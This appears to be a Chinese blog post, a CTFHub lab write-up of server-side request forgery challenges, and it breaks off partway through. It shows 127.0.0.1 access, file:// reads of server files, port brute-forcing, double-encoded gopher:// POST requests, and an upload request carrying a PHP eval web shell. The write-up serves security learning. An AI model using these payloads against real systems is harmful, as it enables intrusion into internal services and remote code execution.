@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hudielan.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fhudielan.png">
+  <link rel="mask-icon" href="/images/hudielan.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入密码') !== ''){
+                alert('密码错误');
+                history.back();
+            }
+        }
+    })();
+</script>
+  <meta name="description" content="SSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfhub技能树web-SSRF">
+<meta property="og:url" content="http://example.com/2022/04/11/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web-SSRF/index.html">
+<meta property="og:site_name" content="影影之家">
+<meta property="og:description" content="SSRF">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151937155.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/8191673cc4562479e5149fade10f89de.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151912869.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151912142.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151917664.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151919220.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151929762.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151930377.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/a255e01f4ee8316446e156d7d33a9337.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1dd9ab6c068f6907d6e924e9db8e11e3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/5b964e89c5efe8cd3b4876a005941d93.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151722943.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151825875.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151826841.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151813008.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151823321.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151852202.png">
+<meta property="og:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151910736.png">
+<meta property="article:published_time" content="2022-04-11T10:56:57.000Z">
+<meta property="article:modified_time" content="2022-06-02T08:55:59.228Z">
+<meta property="article:author" content="吴淑影">
+<meta property="article:tag" content="-web -ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151937155.png">
+
+<link rel="canonical" href="http://example.com/2022/04/11/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web-SSRF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfhub技能树web-SSRF | 影影之家</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">影影之家</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-love">
+
+    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/11/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web-SSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="吴淑影">
+      <meta itemprop="description" content="Believe not all that you see nor half what you hear.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="影影之家">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfhub技能树web-SSRF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-11 18:56:57" itemprop="dateCreated datePublished" datetime="2022-04-11T18:56:57+08:00">2022-04-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-02 16:55:59" itemprop="dateModified" datetime="2022-06-02T16:55:59+08:00">2022-06-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wp%E7%B1%BB/" itemprop="url" rel="index"><span itemprop="name">wp类</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/04/11/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web-SSRF/" class="post-meta-item leancloud_visitors" data-flag-title="ctfhub技能树web-SSRF" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/04/11/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web-SSRF/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/04/11/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web-SSRF/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>SSRF</p>
+<span id="more"></span>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>SSRF（Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者伪造形成由服务器端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>很多的web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL,Web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用的话，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器</p>
+<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>1.可以对外网服务器所在的内网，本地进行端口扫描，获取一些服务的banner信息</p>
+<p>2.攻击运行在内网或者本地的应用程序</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现</p>
+<p>4.攻击内外网的web应用。sql注入，struct2，redis等</p>
+<p>5.利用file协议读取本地文件等</p>
+<h1 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h1><p>先进行dirsearch扫描，发现有flag.php</p>
+<p>访问一下其源码发现有ip限制</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151937155.png" alt="image-20220415193727011"></p>
+<p>直接使用127.0.0.1进行内网访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-25917a94dca3ca9a.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>成功得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8191673cc4562479e5149fade10f89de.png" alt="image-20220411190147544"></p>
+<h1 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h1><p>先看一下flag.php的源码</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151912869.png" alt="image-20220415191231763"></p>
+<p>直接看源代码，找到flag</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151912142.png" alt="image-20220415191258997"></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>打开题目之后发现什么都没有，但是跟内网访问漏洞差不多，根据题目的hint可以看出端在8000-9000之间</p>
+<p>将<code>127.0.0.1:8000-9000</code>拼接入 GET 传参中，使用 BurpSuite 对端口进行爆破：</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151917664.png" alt="image-20220415191707494"></p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151919220.png" alt="image-20220415191907052"></p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151929762.png" alt="image-20220415192925582"></p>
+<p>找出来长度不一样的8800端口，直接url访问，找到flag</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151930377.png" alt="image-20220415193018242"></p>
+<h1 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h1><p>进入靶场，首先看到的是一片空白，没有任何返回，甚至源码里面也没有任何东西，使用dirsearch扫描，下面是一些命令的含义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">参数列表：</span><br><span class="line">-h, --help 查看帮助</span><br><span class="line">-u URL, --url=URL 设置url</span><br><span class="line">-L URLLIST, --url-list=URLLIST 设置url列表</span><br><span class="line">-e EXTENSIONS, --extensions=EXTENSIONS 网站脚本类型</span><br><span class="line">-w WORDLIST, --wordlist=WORDLIST 设置字典</span><br><span class="line">-l, --lowercase 小写</span><br><span class="line">-f, --force-extensions 强制扩展字典里的每个词条</span><br><span class="line">-s DELAY, --delay=DELAY 设置请求之间的延时</span><br><span class="line">-r, --recursive Bruteforce recursively 递归地扫描</span><br><span class="line">–scan-subdir=SCANSUBDIRS, --scan-subdirs=SCANSUBDIRS 扫描给定的url的子目录(用逗号隔开)</span><br><span class="line">–exclude-subdir=EXCLUDESUBDIRS, --exclude-subdirs=EXCLUDESUBDIRS 在递归过程中排除指定的子目录扫描(用逗号隔开)</span><br><span class="line">-t THREADSCOUNT, --threads=THREADSCOUNT 设置扫描线程</span><br><span class="line">-x EXCLUDESTATUSCODES, --exclude-status=EXCLUDESTATUSCODES 排除指定的网站状态码(用逗号隔开)</span><br><span class="line">-c COOKIE, --cookie=COOKIE 设置cookie</span><br><span class="line">–ua=USERAGENT, --user-agent=USERAGENT 设置用户代理</span><br><span class="line">-F, --follow-redirects 跟随地址重定向扫描</span><br><span class="line">-H HEADERS, --header=HEADERS 设置请求头</span><br><span class="line">–random-agents, --random-user-agents 设置随机代理</span><br><span class="line">–timeout=TIMEOUT 设置超时时间</span><br><span class="line">–ip=IP 设置代理IP地址</span><br><span class="line">–proxy=HTTPPROXY, --http-proxy=HTTPPROXY 设置http代理。例如127.0.0.1:8080</span><br><span class="line">–max-retries=MAXRETRIES 设置最大的重试次数</span><br><span class="line">-b, --request-by-hostname 通过主机名请求速度，默认通过IP</span><br><span class="line">–simple-report=SIMPLEOUTPUTFILE 保存结果，发现的路径</span><br><span class="line">–plain-text-report=PLAINTEXTOUTPUTFILE 保存结果，发现的路径和状态码</span><br><span class="line">–json-report=JSONOUTPUTFILE 以json格式保存结果</span><br></pre></td></tr></table></figure>
+
+<p>扫出来了一个/index.php文件以及一个/flag.php文件</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a255e01f4ee8316446e156d7d33a9337.png"></p>
+<p>先通过file协议看一看flag.php以及index.php的源码</p>
+<p><code>url=file:///var/www/html/flag.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">\\flag.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;    //$_SERVER[&quot;REMOTE_ADDR&quot;]意思是访问当前ip地址</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>url=file:///var/www/html/index.php</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">\\index.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();    //curl_init()函数将初始化一个新的会话，返回一个CURL句柄供curl_setopt(), curl_exec(),和 curl_close() 函数使用。如果可选参数被提供，那么CURLOPT_URL选项将被设置成这个参数的值。你可以使用curl_setopt()函数人工设置。</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]);//设置访问url</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);//输出返回头信息</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //设置重定位url</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
+
+<p>首先来访问一下flag.php文件，我们让url=127.0.0.1，通过内网来访问就能直接访问到，访问后看到的是一个方框</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1dd9ab6c068f6907d6e924e9db8e11e3.png" alt="image-20220411195403716"></p>
+<p>查看源码之后知道要post一个key传送到/flag.php</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5b964e89c5efe8cd3b4876a005941d93.png" alt="image-20220411195542254"></p>
+<p>当我们把key放在里面传送的时候，发现有限制，只能用127.0.0.1的路径传输</p>
+<p>再看一下index.php，这里是用了curl函数来获取并且输出数据</p>
+<p>调用   <code>curl_setopt()</code>设置传输选项</p>
+<p>根据   <code>curl_setopt()</code>设置的传输选项，实现回调函数以完成用户特定任务</p>
+<p>curl函数可以支持的伪协议有很多，gopher，file，dict，https等</p>
+<p>首先先来认识一下gopher协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher协议是互联网上使用的分布型的文件搜集获取网络协议，是一种分布式文档传递服务器。利用该服务，用户可以无缝地浏览，搜索和检索驻留在不同位置的信息，gopher协议支持发出的GET，POST请求：可以先截获get请求包或者post请求包，在构成符合gopher协议的请求。gopher协议是SSRF利用中最强大的协议，同时SSRF中经常会使用Gopher来构造GET/POST包进行攻击</span><br><span class="line">使用方法：gopher://ip:port/_payload</span><br><span class="line">gopher默认端口是70</span><br><span class="line">如果发起post请求，回车换行需要使用%0d%0a，如果有多个参数的话，参数之间的&amp;也需要进行url编码</span><br></pre></td></tr></table></figure>
+
+<p>file协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file协议主要是用于访问本地计算机中的文件，要是使用file协议，基本格式如下file:///文件路径</span><br></pre></td></tr></table></figure>
+
+<p>dict协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。</span><br></pre></td></tr></table></figure>
+
+<p>https协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用 SSL（SecureSocket Layer）和 TLS（Transport Layer Security）协议代替而已。 </span><br><span class="line">HTTP+ 加密 + 认证 + 完整性保护 =HTTPS</span><br></pre></td></tr></table></figure>
+
+<p>所以这一题就需要用gopher协议，向flag.php传一个post文报，报文里面含有key，大概的内容为url=gopher://127.0.0.1:80/_POST报文内容，这样，我们就可以通过伪造的127.0.0.1的ip来上传key</p>
+<p>首先来构造一下POST报文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded  </span><br><span class="line">key=6c42e4b05c4a5b666f337ae89d969e1d</span><br></pre></td></tr></table></figure>
+
+<p>POST报文中必须包含Host ，Content-Length ，Content_Type后面加上我们想传输的数据，但是GET请求中可以没有<br>在POST后接上/flag.php，代表着我们想把数据传输的这个目录里去</p>
+<p>302跳转</p>
+<p>表示请求的网页自请求的网页移动到了新的位置，搜索引擎索引中保存原来的URL</p>
+<p>这里可以通过访问302.php，并且传参gopher来伪造本地访问</p>
+<p>这里我们报文内容显示在url上输入，被解码后保存到curl里面，再通过curl输出跳转，又解码了一次，所以我们要对POST报文内容进行两次url编码</p>
+<p>在第一次编码要把%0A全部改成%0D0A，%0A是在linux系统中代表换行符，在windos中是%0D%0A代表换行符，但是网上的编码器大都是编码的%0A，所以我们需要改成windos能够识别的</p>
+<p>第一次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Length:%2036%0AContent-Type:%20application/x-www-form-urlencoded%0A%0Akey=a3b4373b4897b524012d43674d6249e3</span><br></pre></td></tr></table></figure>
+
+<p>第二次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=a3b4373b4897b524012d43674d6249e3</span><br></pre></td></tr></table></figure>
+
+<p>然后输入url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%2520%2520%250D%250Akey=6c42e4b05c4a5b666f337ae89d969e1d</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151722943.png" alt="image-20220415172233703"></p>
+<h1 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h1><p>还是先使用dirsearch扫描一下</p>
+<p>发现有flag.php文件以及302.php文件</p>
+<p>首先来看一下flag.php的内容</p>
+<p>可知是随便上传一个文件就行，访问127.0.0.1/flag.php，可以看到一个上传界面，但是没有提交键，所以这时候就需要手动补一个</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151825875.png" alt="image-20220415182522662"></p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151826841.png" alt="image-20220415182607642"></p>
+<p>然后再随便上传个东西抓一下包</p>
+<p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151813008.png" alt="image-20220415181332844"></p>
+<p>进行两次编码，但是要注意的是第一次编码也需要将%0A改为%0D%0A</p>
+<p>第一次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20challenge-5852d438b3bca312.sandbox.ctfhub.com:10800%0D%0AUser-Agent:%20Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64;%20rv:99.0)%20Gecko/20100101%20Firefox/99.0%0D%0AAccept:%20text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8%0D%0AAccept-Language:%20zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%0D%0AAccept-Encoding:%20gzip,%20deflate%0D%0AContent-Type:%20multipart/form-data;%20boundary=---------------------------414691864916047361701712488296%0D%0AContent-Length:%20388%0D%0AOrigin:%20http://challenge-5852d438b3bca312.sandbox.ctfhub.com:10800%0D%0AConnection:%20close%0D%0AReferer:%20http://challenge-5852d438b3bca312.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php%0D%0ACookie:%20UM_distinctid=17d9519d0e590b-083a4ee93a98a98-4c3e217e-13c680-17d9519d0e67de%0D%0AUpgrade-Insecure-Requests:%201%0D%0A%0D%0A-----------------------------414691864916047361701712488296%0D%0AContent-Disposition:%20form-data;%20name=%22file%22;%20filename=%22shell.php%22%0D%0AContent-Type:%20application/octet-stream%0D%0A%0D%0A%3C?php%20@eval($_POST%5Bshell%5D);?%3E%0D%0A-----------------------------414691864916047361701712488296%0D%0AContent-Disposition:%20form-data;%20name=%22submit%22%0D%0A%0D%0A%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2%0D%0A-----------------------------414691864916047361701712488296--</span><br></pre></td></tr></table></figure>
+
+<p>第二次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520challenge-5852d438b3bca312.sandbox.ctfhub.com:10800%250D%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64;%2520rv:99.0)%2520Gecko/20100101%2520Firefox/99.0%250D%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8%250D%250AAccept-Language:%2520zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%250D%250AAccept-Encoding:%2520gzip,%2520deflate%250D%250AContent-Type:%2520multipart/form-data;%2520boundary=---------------------------414691864916047361701712488296%250D%250AContent-Length:%2520388%250D%250AOrigin:%2520http://challenge-5852d438b3bca312.sandbox.ctfhub.com:10800%250D%250AConnection:%2520close%250D%250AReferer:%2520http://challenge-5852d438b3bca312.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php%250D%250ACookie:%2520UM_distinctid=17d9519d0e590b-083a4ee93a98a98-4c3e217e-13c680-17d9519d0e67de%250D%250AUpgrade-